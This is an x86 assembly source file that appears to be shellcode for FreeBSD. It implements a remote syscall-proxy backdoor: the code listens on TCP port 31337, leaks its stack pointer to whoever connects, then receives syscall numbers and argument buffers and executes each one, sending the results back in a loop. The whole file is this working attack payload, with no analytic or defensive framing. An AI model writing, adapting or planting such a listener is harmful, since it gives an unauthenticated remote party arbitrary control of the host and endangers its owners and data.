.text
.p2align 2,0x90
.globl main
.type            main,@function

main:

	xorl    %esi, %esi      /* %esi is null forever */

	movl    %esp, %ebp      /* save the frame pointer */


	/* Build the stack */
	xorl    %ecx, %ecx
	movb    $0x3, %cl
lp:
	pushl   %esi
	loop    lp

	pushw	$0x697a				/* Set port to 31337 in big-endian */	
	movb	$0x2, %ch
	pushw	%cx

	/* Call socket(2) */
	pushl   %esi                /* protocol             */
	pushl   $0x1                /* type: SOCK_STREAM    */
	pushl   $0x2                /* domain: AF_INET      */
	pushl   %esi                /* null to emulate call */
	xorl    %eax, %eax
	movb    $0x61, %al
	int     $0x80

	jb		jmper

	movl	%eax, %ecx			/* save sockfd in %ecx

	/* call bind(2) */

	movl	%ebp, %edx
	subl    $0x10, %edx

	pushl   $0x10               /* length of sockaddr structure */
	pushl   %edx                /* address of sockaddr          */
	pushl   %ecx                /* sockfd                       */
	pushl   %esi                /* null to emulate call         */
	xorl    %eax, %eax
	movb    $0x68, %al
	int     $0x80

	jnz		ex

	/* call listen(2) */

	/* 0 return from above call counts as first null */
	pushl	%ecx				/* sockfd               */
	pushl	%esi				/* null to emulate call */
	movb	$0x6a, %al
	int		$0x80

	jnz		ex

	/* call to accept(2) */

	/* 0 return from above call counts as first null */
	pushl	%esi
	pushl	%ecx
	pushl	%esi
	movb	$0x1e, %al
	int		$0x80

jmper:
	jb		ex

	movl	%eax, %edi			/* save the returned sockfd in %edi

	/* send %esp via sendto(2) */

	/* build a buffer containing %esp */
	pushl	%esp
	pushl	$0x4
	movl	%esp, %ebx			/* save the address of the buffer */

	xorl	%ecx, %ecx
	movb	$0x8, %cl			/* ecx contains the length of data to send */

sendbytes:
	
	pushl	%esi				/* socklen              */
	pushl	%esi				/* sockaddr             */
	pushl	%esi				/* flags                */
	pushl	%ecx				/* data length          */        
	pushl	%ebx				/* buffer address       */
	pushl	%edi				/* sockfd               */
	pushl	%esi				/* null to emulate call */

	xorl	%eax, %eax
	movb	$0x85, %al
	int		$0x80

	cmpl	%ecx, %eax
	jne		ex

	addl	$0x24, %esp			/* cleanup the stack */

	xorl	%ecx, %ecx			/* setup %ecx as length counter */
	movb	$0x4, %cl

	pushl	%esi				/* setup %ebx as buffer         */	
	movl	%esp, %ebx

	xorl	%edx, %edx			/* setup %edx as loop counter   */
	movb	$0x2, %dl

readlen:

	/* call recvfrom(2) */

	pushl	%esi			/* &fromlen             */
	pushl	%esi			/* &sockaddr            */
	pushl	%esi			/* flags                */
	pushl	$0x1			/* length               */
	pushl	%ebx			/* &buffer              */
	pushl	%edi			/* sockfd               */
	pushl	%esi			/* null to emulate call */

	xorl	%eax, %eax
	movb	$0x1d, %al
	int		$0x80

	addl	$0x1c, %esp		/* clean up the stack */

	addl	%eax, %ebx
	subl	%eax, %ecx
	jnz		readlen

	cmpl	$0x1, %edx
	je		skipper

	movl	-4(%ebx), %ecx	/* put the length in %ecx */

	subl	%ecx, %esp		/* build data buffer      */
	movl	%esp, %ebx		/* setup %ebx as buffer   */

skipper:

	dec		%edx
	jnz		readlen

	movl	(%ebx), %ecx		/* get the length of the buffer */
	
	popl	%eax				/* get the syscall number off the stack */
	//int		$0x3
	int		$0x80

	addl	%ecx, %esp		/* clean the stack for real */

	// temporary hack for later sending of real data blocks
	pushl	%eax
	pushl	$0x4
	movl	%esp, %ebx

	xorl	%ecx, %ecx
	movb	$0x8, %cl
	
	jmp		sendbytes
	
ex:
	xorl    %eax, %eax
	pushl   %eax
	pushl   %eax
	movb    $1,%al
	int     $0x80
